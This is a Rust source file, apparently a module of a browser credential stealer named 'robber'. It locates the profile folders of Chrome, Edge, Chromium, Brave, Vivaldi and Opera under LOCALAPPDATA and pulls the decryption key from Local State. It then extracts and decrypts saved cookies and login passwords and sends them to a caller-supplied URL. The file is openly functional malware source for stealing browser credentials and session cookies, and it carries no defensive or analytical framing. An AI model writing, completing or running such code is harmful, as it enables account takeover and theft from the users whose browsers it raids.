use crate::robber;
use std::env;
use std::path::Path;

fn build_base_directories() -> Vec<std::path::PathBuf> {
    let local = env::var_os("LOCALAPPDATA").unwrap();
    let local_path = Path::new(local.to_str().unwrap());
    let mut base_directories = vec![];
    let directories_all = vec![
        local_path.join("Google").join("Chrome").join("User Data"),
        local_path.join("Microsoft").join("Edge").join("User Data"),
        local_path.join("Chromium").join("User Data"),
        local_path
            .join("BraveSoftware")
            .join("Brave-Browser")
            .join("User Data"),
        local_path.join("Vivaldi").join("User Data"),
        local_path.join("Opera Software").join("Opera Stable"),
    ];
    for directory in directories_all {
        if directory.exists() == true {
            base_directories.push(directory);
        }
    }
    base_directories
}

fn build_cookie_directory(base_dir: &std::path::PathBuf) -> Option<std::path::PathBuf> {
    let cookie_dirs = vec![
        base_dir.join("Default").join("Cookies"),
        base_dir.join("Cookies"),
    ];
    for cookie_dir in cookie_dirs {
        if cookie_dir.exists() == true {
            return Some(cookie_dir);
        }
    }
    None
}
fn build_login_directory(base_dir: &std::path::PathBuf) -> Option<std::path::PathBuf> {
    let login_dirs = vec![
        base_dir.join("Default").join("Login Data"),
        base_dir.join("Login Data"),
    ];
    for login_dir in login_dirs {
        if login_dir.exists() == true {
            return Some(login_dir);
        }
    }
    None
}
fn build_key_directory(base_dir: &std::path::PathBuf) -> Option<std::path::PathBuf> {
    let key_dir = base_dir.join("Local State");
    if key_dir.exists() == true {
        return Some(key_dir);
    }
    None
}

pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> () {
    let base_dirs = build_base_directories();
    for base_dir in base_dirs {
        let key_dir = build_key_directory(&base_dir).unwrap();
        let key = robber::get_key(&key_dir);
        if do_cookie == true {
            let cookie_dir = build_cookie_directory(&base_dir).unwrap();
            let cookie_data = robber::get_cookies(&cookie_dir, &key);
            robber::send_data(cookie_data, url);
        }
        if do_login == true {
            let login_dir = build_login_directory(&base_dir).unwrap();
            let login_data = robber::get_login(&login_dir, &key);
            robber::send_data(login_data, url);
        }
    }
}
